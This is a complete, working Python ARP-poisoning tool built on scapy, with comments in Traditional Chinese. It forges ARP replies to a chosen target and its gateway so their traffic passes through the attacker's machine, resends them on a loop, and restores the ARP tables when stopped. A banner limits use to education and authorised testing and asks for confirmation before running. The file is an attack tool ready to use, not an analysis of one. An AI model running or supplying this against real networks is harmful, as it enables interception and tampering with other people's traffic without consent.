#!/usr/bin/env python3

from scapy.all import *
import threading
import time
import sys
import signal

class SimpleARPPoisoner:
    def __init__(self, target_ip, gateway_ip, interface=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface or conf.iface
        self.is_running = False
        self.target_mac = None
        self.gateway_mac = None
        self.attacker_mac = get_if_hwaddr(self.interface)
        
        print(f"使用網路介面: {self.interface}")
        print(f"攻擊者 MAC: {self.attacker_mac}")
    
    def scan_target(self, ip):
        """掃描目標 IP 獲取 MAC 地址"""
        print(f"正在掃描 {ip} 的 MAC 地址...")
        
       
        arp_request = ARP(op=1, pdst=ip)  
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        
        
        answered, unanswered = srp(packet, timeout=3, verbose=False)
        
        if answered:
            mac = answered[0][1].hwsrc
            print(f"找到 {ip} 的 MAC 地址: {mac}")
            return mac
        else:
            print(f"無法找到 {ip} 的 MAC 地址")
            return None
    
    def prepare_attack(self):
        """準備攻擊 - 獲取目標和閘道的 MAC 地址"""
        print("\n=== 準備階段 ===")
        
        # 獲取目標 MAC
        self.target_mac = self.scan_target(self.target_ip)
        if not self.target_mac:
            return False
        
        # 獲取閘道 MAC
        self.gateway_mac = self.scan_target(self.gateway_ip)
        if not self.gateway_mac:
            return False
        
        print(f"\n目標設備: {self.target_ip} ({self.target_mac})")
        print(f"閘道設備: {self.gateway_ip} ({self.gateway_mac})")
        
        return True
    
    def poison_target(self):
        """向目標發送毒化的 ARP 回應"""
        # 告訴目標：閘道的 MAC 是我們的 MAC
        arp_response = ARP(
            op=2,                    # ARP 回應
            pdst=self.target_ip,     # 目標 IP
            hwdst=self.target_mac,   # 目標 MAC
            psrc=self.gateway_ip,    # 我們偽裝成閘道
            hwsrc=self.attacker_mac  # 我們的 MAC
        )
        send(arp_response, verbose=False)
    
    def poison_gateway(self):
        """向閘道發送毒化的 ARP 回應"""
        # 告訴閘道：目標的 MAC 是我們的 MAC
        arp_response = ARP(
            op=2,                    # ARP 回應
            pdst=self.gateway_ip,    # 閘道 IP
            hwdst=self.gateway_mac,  # 閘道 MAC
            psrc=self.target_ip,     # 我們偽裝成目標
            hwsrc=self.attacker_mac  # 我們的 MAC
        )
        send(arp_response, verbose=False)
    
    def poison_loop(self):
        """ARP 毒化主迴圈"""
        packet_count = 0
        while self.is_running:
            # 同時毒化目標和閘道
            self.poison_target()
            self.poison_gateway()
            
            packet_count += 2
            print(f"\r已發送 {packet_count} 個毒化封包", end="", flush=True)
            
            time.sleep(2)  # 每 2 秒發送一次
    
    def start_attack(self):
        """開始 ARP 毒化攻擊"""
        if not self.prepare_attack():
            print("準備階段失敗，無法開始攻擊")
            return False
        
        print("\n=== 開始攻擊 ===")
        print("ARP 毒化攻擊已開始...")
        print("按 Ctrl+C 停止攻擊")
        
        self.is_running = True
        
        # 在新執行緒中運行攻擊迴圈
        self.attack_thread = threading.Thread(target=self.poison_loop)
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        return True
    
    def stop_attack(self):
        """停止攻擊"""
        print("\n\n=== 停止攻擊 ===")
        self.is_running = False
        
        if hasattr(self, 'attack_thread'):
            self.attack_thread.join(timeout=1)
        
        print("正在恢復正常的 ARP 表...")
        self.restore_arp_table()
        print("攻擊已停止，ARP 表已恢復")
    
    def restore_arp_table(self):
        """恢復正確的 ARP 表"""
        # 發送正確的 ARP 回應來恢復網路
        
        for i in range(5):  # 發送多次確保恢復
            # 恢復目標的 ARP 表
            restore_target = ARP(
                op=2,
                pdst=self.target_ip,
                hwdst=self.target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac
            )
            
            # 恢復閘道的 ARP 表
            restore_gateway = ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=self.target_ip,
                hwsrc=self.target_mac
            )
            
            send(restore_target, verbose=False)
            send(restore_gateway, verbose=False)
            
            time.sleep(0.5)

def signal_handler(sig, frame):
    """處理 Ctrl+C 信號"""
    global poisoner
    if 'poisoner' in globals():
        poisoner.stop_attack()
    sys.exit(0)

def main():
    global poisoner
    
    print("=" * 50)
    print("       ARP 毒化攻擊工具")
    print("     僅供教育和授權測試使用")
    print("=" * 50)
    
    # 檢查參數
    if len(sys.argv) != 3:
        print("使用方法:")
        print(f"  {sys.argv[0]} <目標IP> <閘道IP>")
        print("\n範例:")
        print(f"  {sys.argv[0]} 192.168.1.100 192.168.1.1")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    
    # 安全確認
    print(f"\n即將對以下目標執行 ARP 毒化攻擊:")
    print(f"  目標 IP: {target_ip}")
    print(f"  閘道 IP: {gateway_ip}")
    print("\n警告：此操作僅應在授權的測試環境中執行！")
    
    confirm = input("\n確認執行攻擊？(輸入 'YES' 確認): ")
    if confirm != 'YES':
        print("操作已取消")
        sys.exit(0)
    
    # 設定信號處理器
    signal.signal(signal.SIGINT, signal_handler)
    
    # 建立攻擊器並開始攻擊
    poisoner = SimpleARPPoisoner(target_ip, gateway_ip)
    
    if poisoner.start_attack():
        try:
            # 保持程式運行直到用戶中斷
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            poisoner.stop_attack()
    else:
        print("攻擊啟動失敗")

if __name__ == "__main__":
    main()
